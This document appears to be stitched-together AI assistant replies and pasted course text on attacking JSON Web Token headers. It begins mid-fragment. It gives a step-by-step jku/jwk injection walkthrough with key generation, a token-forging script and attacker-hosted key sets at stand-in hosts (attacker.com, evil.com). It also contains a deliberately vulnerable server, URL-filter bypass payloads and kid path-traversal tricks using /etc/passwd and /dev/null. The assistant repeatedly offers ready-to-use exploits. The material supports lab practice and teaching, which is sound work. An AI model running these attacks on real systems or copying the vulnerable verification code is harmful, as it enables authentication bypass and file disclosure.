  "jwk": {
    "kty": "RSA",
    "n": "test",
    "e": "AQAB"
  }
}

👉 Send request

🧠 Observe response:
Result	Meaning
❌ Invalid signature	Server ignores JWK
⚠️ Different error	Server processing JWK
✅ Success	VULNERABLE
🔍 3. THIRD CLUE — ERROR-BASED DISCOVERY

You intentionally break things:

🧪 Modify kid
"kid": "../../../../etc/passwd"
Observe:
500 error → file access attempt
SQL error → DB lookup
Different response → dynamic behavior

👉 Confirms:
Server uses header values internally

🔍 4. FOURTH CLUE — TRY JKU FIRST

Before JWK, pros test:

"jku": "http://attacker.com/jwks.json"
Why?

Because:

Many apps support remote key fetching
If JKU works → JWK often also works
🔍 5. FIFTH CLUE — NO KEY PINNING

If server:

Doesn’t restrict keys
Doesn’t validate issuer
Doesn’t whitelist keys

👉 It may accept any key you provide

🧠 REAL PENTEST THINKING FLOW

Here’s exactly how an expert thinks:

🧩 Step-by-step reasoning:
JWT found ✅
Algorithm = RS256 ✅
kid present ✅

👉 Conclusion: dynamic key handling likely

Try:
Modify payload → fails ❌
👉 Signature verified
Try:
JKU → test remote key
JWK → inline key

👉 Observe behavior

If server:
Accepts your key
👉 AUTH BYPASS
🔥 WHEN JWK INJECTION IS POSSIBLE (SUMMARY)

You suspect it when:

✅ RS256 / asymmetric algorithm
✅ kid present
✅ External key usage possible
✅ Server behavior changes when header modified
✅ No strict key validation

🚫 WHEN IT WILL NOT WORK

❌ Server uses fixed key
❌ Key is hardcoded
❌ JWK ignored
❌ Signature verified against trusted store only

⚡ PRO TIP (REAL WORLD)

In PortSwigger Web Security Academy labs:

👉 They intentionally allow:

JWK injection
JKU exploitation

But in real apps:

You need to detect behavior differences carefully
🧠 ELITE LEVEL INSIGHT

You are not testing “JWT”

You are testing:

👉 How the server TRUSTS KEYS


Great question—this is a **very important JWT attack concept**, and I’ll explain it in a **simple, real-world way** 👇

---

# 🔐 What is happening here (simple idea)

Normally, a server verifies a JSON Web Token (JWT) like this:

1. Reads the token
2. Gets the **public key**
3. Verifies the signature

---

# 🔗 What is `jku`?

### 👉 `jku` = **JSON Web Key URL**

It is a **header parameter inside JWT** that tells the server:

> “Hey, go to this URL and download the public keys to verify me.”

---

# 📦 What is a JWK Set?

Think of it like:

👉 A **JSON file containing public keys**

Example:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "abc123",
      "n": "xyz..."
    }
  ]
}
```

---

# 🧠 Normal (Secure) Flow

1. JWT comes to server
2. Server sees:

```json
"jku": "https://trusted-site.com/jwks.json"
```

3. Server:

   * Downloads keys from trusted site
   * Verifies token

✅ Safe if URL is trusted

---

# 🚨 Attack (Simple Explanation)

### Step-by-step:

### 1. Attacker creates their own key pair

* Private key → to sign token
* Public key → to share

---

### 2. Attacker hosts their own JWK Set

Example:

```
https://attacker.com/jwks.json
```

---

### 3. Attacker modifies JWT header

```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json",
  "kid": "attacker-key"
}
```

---

### 4. Attacker signs token with THEIR private key

Payload:

```json
{
  "sub": "administrator"
}
```

---

### 5. Server receives token 😱

If server is vulnerable:

* It **blindly trusts jku URL**
* Fetches keys from attacker site
* Uses attacker public key
* Signature becomes VALID ✅

---

# 🎯 Result

👉 Attacker becomes **admin without real credentials**

---

# ⚠️ Why this vulnerability happens

Because server:

* ❌ Does NOT validate `jku` domain
* ❌ Trusts any external URL
* ❌ Doesn’t whitelist trusted sources

---

# 🧠 Easy Analogy

Think like this:

👉 Server says:

> “Give me your ID, I’ll verify it from your website”

Attacker says:

> “Sure 😎 here’s my website”

Server:

> “Looks valid, you are admin!”

---

# 🔥 Key Terms (Interview Ready)

* JWK → JSON Web Key
* JWK Set → List of keys
* `jku` → URL to fetch keys
* Attack → **JWK Injection / jku abuse**

---

# 🔐 How to Prevent

* Only allow **trusted domains**
* Ignore `jku` from token
* Use **fixed key (hardcoded or config)**
* Validate `kid` properly

---

# 🎯 For YOU (QA + Security)

In testing, check:

* Can you modify `jku`?
* Does server fetch external URL?
* Can you host your own JWKS?

---
Nice—this is a **high-value security topic** 🔥
I’ll show you a **safe, step-by-step demo flow** (like PortSwigger labs) so you understand **how jku attack works in practice**.

---

# ⚠️ Before we start

Use this only for:

* Labs (PortSwigger)
* Your own test apps

---

# 🧪 jku Attack Demo (Step-by-Step)

## 🎯 Goal:

Forge a valid JSON Web Token (JWT) as **admin**

---

# 🔹 Step 1: Capture Original JWT

From:

* Browser cookie
* Authorization header

Example:

```text
eyJhbGciOiJSUzI1NiIsImtpZCI6ImFiYyJ9.eyJzdWIiOiJ1c2VyIn0.signature
```

---

# 🔹 Step 2: Decode JWT

Use:

* jwt.io
  or Python

You’ll see:

```json
Header:
{
  "alg": "RS256",
  "kid": "abc"
}

Payload:
{
  "sub": "user"
}
```

---

# 🔹 Step 3: Generate Your Own Key Pair

Use:

* OpenSSL (Kali/Linux)

```bash
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
```

---

# 🔹 Step 4: Create Your Malicious JWK Set

Convert public key → JWK format

Example:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "e": "AQAB",
      "n": "your_generated_modulus"
    }
  ]
}
```

👉 Save as:

```
jwks.json
```

---

# 🔹 Step 5: Host the JWK Set

Host this file on:

* Your local server
* Or any public URL

Example:

```bash
python3 -m http.server 8000
```

Now accessible at:

```
http://YOUR-IP:8000/jwks.json
```

---

# 🔹 Step 6: Modify JWT Header

Change header to:

```json
{
  "alg": "RS256",
  "kid": "attacker-key",
  "jku": "http://YOUR-IP:8000/jwks.json"
}
```

---

# 🔹 Step 7: Modify Payload

```json
{
  "sub": "administrator"
}
```

---

# 🔹 Step 8: Sign the Token

Use your **private key**

Python example:

```python
import jwt

token = jwt.encode(
    {"sub": "administrator"},
    open("private.pem").read(),
    algorithm="RS256",
    headers={
        "jku": "http://YOUR-IP:8000/jwks.json",
        "kid": "attacker-key"
    }
)

print(token)
```

---

# 🔹 Step 9: Send Token to Server

* Replace cookie / Authorization header
* Send request

---

# 🔥 Step 10: If Vulnerable

Server will:

1. Read `jku`
2. Fetch your JWKS
3. Use your public key
4. Validate your signature

👉 Result:

```
Logged in as administrator ✅
```

---

# 🚨 Why This Works

Server trusts:

* External `jku` URL ❌
* No domain validation ❌

---

# 🧠 QA Testing Checklist

During testing, check:

* Can you add `jku` in header?
* Does server fetch external URLs?
* Is domain validation missing?
* Can you control `kid`?

---

# 🔐 Prevention (Interview Gold)

* Whitelist trusted JWKS URLs
* Ignore `jku` from client
* Use fixed public keys
* Validate issuer/domain

---

# 🎯 Real Interview Answer

> jku attack works by hosting a malicious JWKS and pointing the JWT header to it. If the server trusts the URL without validation, it fetches the attacker’s key and accepts a forged token.

---

# 🚀 Want to go deeper?

I can give you:
✅ **Burp Suite step-by-step attack**
✅ Full **ready-to-run GitHub PoC**
✅ Practice lab similar to PortSwigger

Just say: **“burp demo”** or **“give PoC project”** 💻🔥
Great—this will be a **strong resume-level project** for QA + Security 🔥
I’ll give you a **safe PoC project structure** that demonstrates how `jku` misconfiguration can be tested in a controlled lab environment (like PortSwigger).

---

# 🚀 Project: JWT `jku` Injection PoC (QA + Security)

## 🎯 Objective

Simulate and test:

* JSON Web Token (JWT) verification
* Misconfigured `jku` header
* How improper validation can lead to **accepting untrusted keys**

---

# 📁 Project Structure

```
jwt-jku-poc/
│
├── server/              # Demo vulnerable server (local only)
│   └── app.py
│
├── attacker/            # Attacker simulation (safe lab)
│   ├── jwks.json
│   ├── private.pem
│   ├── public.pem
│   └── generate_token.py
│
├── requirements.txt
└── README.md
```

---

# ⚙️ Step 1: Install Dependencies

```bash
pip install flask pyjwt cryptography requests
```

---

# 🖥️ Step 2: Vulnerable Server (FOR LAB ONLY)

👉 `server/app.py`

```python
from flask import Flask, request, jsonify
import jwt
import requests

app = Flask(__name__)

@app.route("/login")
def login():
    token = request.headers.get("Authorization")

    try:
        header = jwt.get_unverified_header(token)

        # 🚨 Vulnerable: blindly trusting jku
        jwks_url = header.get("jku")
        kid = header.get("kid")

        jwks = requests.get(jwks_url).json()

        key = None
        for k in jwks["keys"]:
            if k["kid"] == kid:
                key = jwt.algorithms.RSAAlgorithm.from_jwk(k)

        decoded = jwt.decode(token, key=key, algorithms=["RS256"])

        return jsonify({"message": "Access granted", "user": decoded})

    except Exception as e:
        return jsonify({"error": str(e)}), 401

app.run(port=5000)
```

---

# 🔑 Step 3: Generate Keys

```bash
openssl genrsa -out attacker/private.pem 2048
openssl rsa -in attacker/private.pem -pubout -out attacker/public.pem
```

---

# 📦 Step 4: Create Malicious JWKS

👉 `attacker/jwks.json`

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "e": "AQAB",
      "n": "REPLACE_WITH_YOUR_MODULUS"
    }
  ]
}
```

👉 Convert public key → modulus (`n`) using Python or tools

---

# 🌐 Step 5: Host JWKS

```bash
cd attacker
python -m http.server 8000
```

👉 Now available at:

```
http://localhost:8000/jwks.json
```

---

# 🧪 Step 6: Generate Malicious Token

👉 `attacker/generate_token.py`

```python
import jwt

private_key = open("private.pem").read()

token = jwt.encode(
    {"sub": "administrator"},
    private_key,
    algorithm="RS256",
    headers={
        "jku": "http://localhost:8000/jwks.json",
        "kid": "attacker-key"
    }
)

print("Generated Token:\n", token)
```

---

# ▶️ Step 7: Run Everything

### Terminal 1:

```bash
python server/app.py
```

### Terminal 2:

```bash
cd attacker
python -m http.server 8000
```

### Terminal 3:

```bash
python generate_token.py
```

---

# 🔥 Step 8: Send Request

```bash
curl -H "Authorization: YOUR_TOKEN" http://localhost:5000/login
```

---

# 🎯 Expected Result (Vulnerable Behavior)

```json
{
  "message": "Access granted",
  "user": {
    "sub": "administrator"
  }
}
```

👉 Even though server should NOT trust your key 😱

---

# 🧠 What You Learned

* How `jku` works
* How JWKS is fetched
* Why trusting external keys is dangerous

---

# 🔐 Secure Fix (IMPORTANT)

Update server:

```python
# FIX: Only allow trusted domain
if not jwks_url.startswith("https://trusted.com"):
    raise Exception("Untrusted JWKS URL")
```

---

# 📌 Resume Line (Use this 🔥)

> Built a Python-based security testing PoC demonstrating JWT `jku` injection vulnerability, simulating misconfigured key validation and implementing mitigation strategies.

---

# 🚀 Want next level?

I can help you:
✅ Add **Burp Suite testing workflow**
✅ Add **pytest automation for this PoC**
✅ Push this as **GitHub project with README**

Just say: **“make it GitHub ready”** or **“add automation tests”** 💻🔥

Great question—that’s exactly how a good QA/security tester thinks 👍
You don’t blindly try `jku` attacks—you **identify signals first**, then test.

Here’s a **practical way to detect when to try a `jku` injection** 👇

---

# 🧠 Step 1: Confirm it’s a JWT

Look for:

* Cookie / header like:

```text
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
```

Decode it using:

* jwt.io

---

# 🔍 Step 2: Check Algorithm (VERY IMPORTANT)

Look at header:

```json
{
  "alg": "RS256",
  "kid": "abc123"
}
```

### 🎯 Key Insight:

* `RS256` → uses **public key verification**
* That’s where `jku` becomes relevant ✅

👉 If it’s:

* `HS256` → ❌ no `jku` attack (different attack: brute force)

---

# 🔎 Step 3: Look for Key-Related Headers

Check if JWT already contains:

* `kid`
* `jku`
* `jwk`
* `x5u`

### Example:

```json
{
  "alg": "RS256",
  "kid": "abc123",
  "jku": "https://example.com/jwks.json"
}
```

### 🚨 If you see this:

👉 HIGH chance `jku` is used → test it

---

# 🌐 Step 4: Check Network Behavior (Very Important)

Use:

* Burp Suite

### What to look for:

* Does server call external URL?
* Try replacing `jku` with:

```text
http://your-server.com/jwks.json
```

👉 Then monitor:

* Did your server receive a request?

### 🎯 If YES:

👉 Server is fetching keys → vulnerable surface

---

# 🧪 Step 5: Modify `jku` (Initial Test)

Change header:

```json
{
  "alg": "RS256",
  "kid": "test",
  "jku": "http://your-ip/jwks.json"
}
```

👉 Send request

### Observe:

* Any delay? (fetch happening)
* Different error messages?
* Connection attempts?

---

# 🔥 Step 6: Error-Based Clues

Look for errors like:

* `Invalid key`
* `Key not found`
* `JWKS fetch failed`

👉 These confirm:

* Server is trying to process your `jku`

---

# 🚨 Step 7: Check for Missing Validation

Ask:

* Is `jku` domain validated?
* Can it point to localhost / IP?
* Can it be HTTP (not HTTPS)?

👉 If YES → vulnerability likely

---

# 🧠 Quick Decision Tree (Very Useful)

```
JWT found?
   ↓
Is alg = RS256?
   ↓
Is kid present?
   ↓
Try adding jku
   ↓
Does server fetch external URL?
   ↓
YES → Try full jku attack
```

---

# 🎯 Real QA Testing Checklist

✅ JWT present
✅ RS256 algorithm
✅ `kid` used
✅ Server fetches keys dynamically
✅ No domain whitelist
✅ External URL allowed

👉 = Try `jku` injection

---

# 🔐 When NOT to try `jku`

❌ HS256 tokens
❌ No external key fetching
❌ Hardcoded public key (no `kid`, no `jku`)

---

# 🎤 Interview Answer (Perfect)

> I first check if the JWT uses RS256 and contains key identifiers like `kid`. Then I test whether the server dynamically fetches keys by injecting a `jku` header pointing to my controlled server. If the server makes a request, it indicates potential vulnerability to JWK injection.

---

# 🚀 Want to practice?

I can give you:
✅ Real **test cases checklist (QA format)**
✅ Burp Suite hands-on steps
✅ 3–4 **real-world scenarios to practice**

Just say: **“give test cases”** or **“burp practice”** 🔥

The URL specification contains a number of features that are likely to be overlooked when URLs implement ad-hoc parsing and validation using this method:

    You can embed credentials in a URL before the hostname, using the @ character. For example:
    https://expected-host:fakepassword@evil-host

    You can use the # character to indicate a URL fragment. For example:
    https://evil-host#expected-host

    You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
    https://expected-host.evil-host
    You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.
    You can use combinations of these techniques together.

Great—this is exactly how jku attacks become real bypasses in apps. I’ll connect your theory with the earlier jku injection flow so it becomes crystal clear 👇

🔐 First: What the app is trying to do

In a jku scenario (from above):

👉 Server tries to protect itself like:

if "trusted.com" in jku_url:
    allow()
else:
    block()

This is called a whitelist check ❌ (but implemented poorly)

🧠 Problem: URL parsing confusion

Different parts of the system:

Validation logic (filter)
Actual HTTP request (real fetch)

👉 These may interpret URL differently

🔗 Now connect to jku attack

You (attacker/tester) want:
👉 Server to fetch your malicious JWKS
👉 But filter only allows: trusted.com

So you trick it 😎

🚨 Bypass Techniques (with jku context)
🔹 1. @ (Credentials trick)
Input:
https://trusted.com@evil.com/jwks.json
What happens:
Component	Sees
Filter	✅ contains trusted.com
Actual request	❌ goes to evil.com

👉 Because:

trusted.com is treated as username
Real host = evil.com
🔹 2. # (Fragment trick)
https://evil.com#trusted.com
What happens:
Component	Sees
Filter	✅ sees trusted.com
Browser/server	❌ ignores fragment

👉 Real request goes to:

https://evil.com
🔹 3. Subdomain trick
https://trusted.com.evil.com/jwks.json
What happens:
Component	Sees
Filter	✅ contains trusted.com
DNS	❌ actual domain = evil.com
🔹 4. URL Encoding trick
https://evil.com%23trusted.com

or

https://trusted.com%40evil.com
What happens:
Filter checks raw string
Server decodes → different meaning
🔹 5. Double Encoding (Advanced)
%2523 → decoded twice → #

👉 Some systems decode twice → confusion

🔥 Combine with jku Attack

Now apply to your JWT:

{
  "alg": "RS256",
  "kid": "attacker-key",
  "jku": "https://trusted.com@evil.com/jwks.json"
}
💣 Full Attack Flow

App checks:

if "trusted.com" in jku → ✅

App fetches:

https://trusted.com@evil.com/jwks.json
Actually goes to:
👉 evil.com
Gets attacker’s key
Verifies attacker’s JWT
💥 Authentication bypass
🧠 Why this works (simple)

👉 Filter = string check
👉 Real request = URL parsing

Both behave differently → vulnerability

🎯 QA Testing Mindset

When testing jku, try:

trusted.com@your-ip
trusted.com.yourdomain.com
yourdomain.com#trusted.com
URL encoded payloads
🔐 Secure Fix (Interview Answer)

Instead of:

if "trusted.com" in url:

Use:

parse_url(url).hostname == "trusted.com"

👉 Strict hostname validation ✅

🎤 Interview Answer (Perfect)

Applications that validate jku using simple string matching can be bypassed using URL parsing tricks like @, #, subdomains, or encoding. These tricks make the filter see a trusted domain while the actual request is sent to an attacker-controlled server, enabling JWK injection.

🚀 If you want next level

I can give:
✅ 10 real payloads list (ready to use)
✅ Burp Suite hands-on practice steps
✅ Combine with SSRF testing



*Injecting self-signed JWTs via the kid parameter*
*Servers may use several cryptographic keys for signing different kinds of data, not just JWTs. For this reason, the header of a JWT may contain a kid (Key ID) parameter, which helps the server identify which key to use when verifying the signature.*
*Verification keys are often stored as a JWK Set. In this case, the server may simply look for the JWK with the same kid as the token. However, the JWS specification doesn't define a concrete structure for this ID - it's just an arbitrary string of the developer's choosing. For example, they might use the kid parameter to point to a particular entry in a database, or even the name of a file.*
*If this parameter is also vulnerable to directory traversal, an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key.*
{
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
*This is especially dangerous if the server also supports JWTs signed using a symmetric algorithm. In this case, an attacker could potentially point the kid parameter to a predictable, static file, then sign the JWT using a secret that matches the contents of this file.*
*You could theoretically do this with any file, but one of the simplest methods is to use /dev/null, which is present on most Linux systems. As this is an empty file, reading it returns an empty string. Therefore, signing the token with a empty string will result in a valid signature.*

Alright — let’s simplify this like you’re explaining it in an interview 👇

---

# 🧠 SIMPLE IDEA FIRST

👉 The **`kid` (Key ID)** tells the server:

> “Hey, use THIS key to verify my JWT”

---

# 🔑 NORMAL FLOW (SAFE CASE)

1. Server has keys stored somewhere (file / DB)
2. JWT comes with:

```json
{
  "kid": "key1"
}
```

3. Server:

* Finds `key1`
* Uses it to verify signature

✅ All good

---

# 🚨 WHAT GOES WRONG (VULNERABILITY)

The problem is:

👉 **`kid` is just a string — no strict rules**

So developers sometimes do things like:

```python
key = open(kid).read()
```

OR

```sql
SELECT key FROM keys WHERE id = kid
```

👉 That means **you control what key server loads**

---

# 💥 ATTACK IDEA (VERY SIMPLE)

You trick the server into using a key **you control or predict**

---

# 🔴 CASE 1 — Directory Traversal via `kid`

You send:

```json
{
  "kid": "../../../../etc/passwd"
}
```

👉 Server tries:

```python
open("../../../../etc/passwd")
```

💥 Now server is using **system file as key**

---

# 🔴 CASE 2 — Using `/dev/null` (MOST IMPORTANT)

👉 `/dev/null` = special file in Linux
👉 It always returns **empty content**

---

## 🔥 Attack Trick

1. Set:

```json
{
  "kid": "/dev/null",
  "alg": "HS256"
}
```

2. Server reads:

```python
key = open("/dev/null").read()
```

👉 key = `""` (empty string)

---

3. You sign JWT using **empty secret**:

```python
jwt.encode(payload, "", algorithm="HS256")
```

---

4. Server verifies:

* Uses empty string as secret ✅
* Signature matches ✅

💥 **YOU BYPASS AUTHENTICATION**

---

# 🧠 WHY THIS WORKS

Because:

| Problem                        | Impact                 |
| ------------------------------ | ---------------------- |
| `kid` not validated            | You control key source |
| File read allowed              | You choose file        |
| HS256 allowed                  | You can sign token     |
| Predictable file (`/dev/null`) | You know the secret    |

---

# 📌 SUPER SIMPLE ANALOGY

Think of it like:

* Server asks: “Which key should I use?”
* You reply: “Go read this file → `/dev/null`”
* That file is empty → so password = empty
* You also use empty password

👉 Server says: “Correct password” 😅

---

# 🚫 WHEN THIS WON’T WORK

❌ Server:

* Doesn’t read files from `kid`
* Uses fixed keys only
* Validates `kid` strictly
* Only allows RS256 (not HS256)

---

# 🔥 FINAL ONE-LINE UNDERSTANDING

👉 **You trick the server into using a predictable key (like empty file), then sign JWT with that same key to bypass authentication**

---

# 🚀 IF YOU WANT NEXT STEP

I can show you:

* 🔥 Full exploit in **PortSwigger Web Security Academy** lab
* 🔥 Python script for `/dev/null` attack
* 🔥 How to detect this in real APIs automatically

Just say:
👉 “lab demo” or “script”


Other interesting JWT header parameters

The following header parameters may also be interesting for attackers:

    cty (Content Type) - Sometimes used to declare a media type for the content in the JWT payload. This is usually omitted from the header, but the underlying parsing library may support it anyway. If you have found a way to bypass signature verification, you can try injecting a cty header to change the content type to text/xml or application/x-java-serialized-object, which can potentially enable new vectors for XXE and deserialization attacks.

    x5c (X.509 Certificate Chain) - Sometimes used to pass the X.509 public key certificate or certificate chain of the key used to digitally sign the JWT. This header parameter can be used to inject self-signed certificates, similar to the jwk header injection attacks discussed above. Due to the complexity of the X.509 format and its extensions, parsing these certificates can also introduce vulnerabilities. Details of these attacks are beyond the scope of these materials, but for more details, check out CVE-2017-2800 and CVE-2018-2633.
explain in simple ways

Great—let’s simplify this a lot so it’s easy to remember 👍

🧠 Big Idea

👉 These JWT headers (cty, x5c) are extra fields
👉 Normally harmless
👉 But if server is weak → attacker can abuse them

📦 1. cty (Content Type)
👉 Simple meaning:

“This tells server what type of data is inside the JWT”

🧾 Example:
{ "cty": "application/json" }

👉 Normal case: JSON data

💥 Attack idea:

Attacker changes:

{ "cty": "text/xml" }

OR

{ "cty": "application/x-java-serialized-object" }
🤯 What happens?

If server trusts it:

It may try to parse payload differently
Example:
XML → can lead to XXE attack
Java object → can lead to deserialization attack
🎯 Simple understanding:

👉 You are tricking server:

“Don’t treat this as JSON, treat it as something else 😎”

🔐 2. x5c (Certificate Chain)
👉 Simple meaning:

“Here is my certificate (public key), use it to verify”

🧾 Example:
{
  "x5c": ["certificate_data_here"]
}
💥 Attack idea:

👉 Attacker sends:

Their own fake/self-signed certificate
🤯 What happens?

If server trusts it:

Uses attacker certificate → verifies token → accepts it

👉 💥 Authentication bypass

🎯 Simple understanding:

👉 Same like jwk attack:

“Use MY certificate to verify me”

⚠️ Extra Risk

👉 Certificates are complex

👉 Bad parsing can cause:

Security bugs
Crashes
Known CVEs (like mentioned)
🧠 Super Simple Summary
Header	Meaning	Attack
cty	Content type	Trick server to parse differently (XXE, deserialization)
x5c	Certificate	Inject your own certificate to bypass auth
⚡ One Line Memory

cty = change how server reads data
x5c = change which key server trusts


how to put the jwk into webhook.site

Good question — and this is where many people get stuck 👍

Short answer:

👉 You cannot directly use Webhook.site to serve a JWK (JWKS JSON)
👉 But you can use it to detect if JKU is being fetched

Let’s break it clearly 👇

🚫 WHY YOU CAN’T “PUT JWK” IN WEBHOOK.SITE

Webhook.site is designed to:

✅ Capture incoming requests
❌ NOT return custom JSON responses (like JWKS)

So if you set:

"jku": "https://webhook.site/your-id"

👉 Server will:

Send request → ✔️ you can see it
Expect JSON response → ❌ webhook.site does NOT provide your JWK

👉 Result:
Attack will fail, but you get valuable signal

🧠 WHAT YOU SHOULD USE WEBHOOK.SITE FOR
🔍 Step 1 — Detection (VERY IMPORTANT)
Put this in JWT:
{
  "jku": "https://webhook.site/your-id"
}
Send request
✅ If you see a hit in webhook.site:

💥 That means:

Server is fetching JKU
External URL is allowed

👉 You just found a vulnerability entry point

🔥 STEP 2 — REAL EXPLOIT (SWITCH TOOL)

Now move to a tool that can serve JSON

✅ Use instead:
👉 Pipedream (BEST)

OR

👉 Beeceptor
🛠️ HOW TO SERVE JWK (WORKING METHOD)
Example JWKS you need to return:
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "evil-key",
      "n": "YOUR_MODULUS",
      "e": "AQAB"
    }
  ]
}
In Pipedream:

Use code:

export default defineComponent({
  async run({ res }) {
    res.setHeader("Content-Type", "application/json");
    res.end(JSON.stringify({
      keys: [
        {
          kty: "RSA",
          kid: "evil-key",
          n: "YOUR_MODULUS",
          e: "AQAB"
        }
      ]
    }));
  },
});
🔁 FULL FLOW (IMPORTANT)
✔ Step 1:

Use Webhook.site
👉 Confirm JKU is fetched

✔ Step 2:

Switch to Pipedream
👉 Serve real JWKS

✔ Step 3:

Send JWT:

{
  "jku": "https://your-pipedream-url",
  "kid": "evil-key"
}
✔ Step 4:

Sign token with your private key

👉 If server accepts → 💥 AUTH BYPASS

🧠 PRO TIP (VERY IMPORTANT)

Many beginners fail because:

❌ They try to exploit directly
✅ Experts first confirm behavior using webhook

🚀 IF YOU WANT

I can give you:

🔥 Ready-to-use JWKS generator script (Python)
🔥 Full PortSwigger lab walkthrough (exact steps)
🔥 One-click JWT attack tool (like Burp plugin)

Just say:
👉 “full working exploit”

kid header path traversal is used for rs256 or HS256?

Great question — and this is exactly where many people get confused. Let’s make it crystal clear 👇

🧠 SHORT ANSWER

👉 kid path traversal is mainly useful with HS256 (symmetric)
👉 But it can appear in both RS256 and HS256 contexts

🔍 WHY? (CORE DIFFERENCE)
🔐 HS256 (Symmetric)
Server uses same secret to:
sign JWT
verify JWT

👉 If you control kid → you control which secret is used

🔐 RS256 (Asymmetric)
Server uses:
private key → sign
public key → verify

👉 You cannot sign with public key

So path traversal is less powerful here

🔥 REAL ATTACK SCENARIOS
🔴 CASE 1 — HS256 + kid Path Traversal (MOST IMPORTANT)
💥 Vulnerable Code Example
key = open(kid).read()
jwt.decode(token, key, algorithms=["HS256"])
🔥 Exploit

You send:

{
  "alg": "HS256",
  "kid": "/dev/null"
}

👉 Server does:

key = open("/dev/null").read()

👉 key = "" (empty string)

✅ You sign token with:
secret = ""

💥 Signature matches → AUTH BYPASS

🔴 CASE 2 — RS256 + kid Path Traversal
💥 What happens?
key = open(kid).read()
jwt.decode(token, key, algorithms=["RS256"])
🔥 Impact

👉 You can:

Read files (LFI)
Cause errors
Leak internal paths
❌ But:

You cannot easily forge valid token
(because you don’t have private key)

🔥 IMPORTANT COMBO ATTACK

This is where real exploitation happens 👇

🧠 RS256 → HS256 CONFUSION + kid

If server:

❌ Accepts both RS256 and HS256
❌ Uses kid to load key

🔥 Attack:
Change:
"alg": "HS256"
Set:
"kid": "/dev/null"
Sign token using:
secret = ""

👉 Server:

Reads /dev/null → empty secret
Uses HS256 → verifies

💥 FULL AUTH BYPASS

📊 FINAL COMPARISON
Scenario	Works?	Impact
HS256 + kid traversal	✅ YES	Auth bypass
RS256 + kid traversal	⚠️ LIMITED	File read / errors
RS256 → HS256 + kid	🔥 BEST	Full bypass
🧠 HOW TO DECIDE IN PENTEST

When you see:

{
  "alg": "RS256",
  "kid": "something"
}

👉 Do this:

Try path traversal (../../etc/passwd)
Try /dev/null
Try switching to HS256
Sign with empty or known secret
⚡ ONE-LINE EXPERT ANSWER (INTERVIEW)

👉 “kid path traversal is most exploitable with HS256 because it allows control over the secret key, but in RS256 it mainly leads to file read unless combined with algorithm confusion.”

JWT Algorithm	Can do alg confusion?	Main attack technique
RS256	✅ Yes	RS → HS algorithm confusion
RS256	✅ Yes	jku / x5u injection
HS256	❌ No	Secret brute-force
HS256	❌ No	Secret leakage
HS256	❌ No	alg:none
HS256	❌ No	kid injection

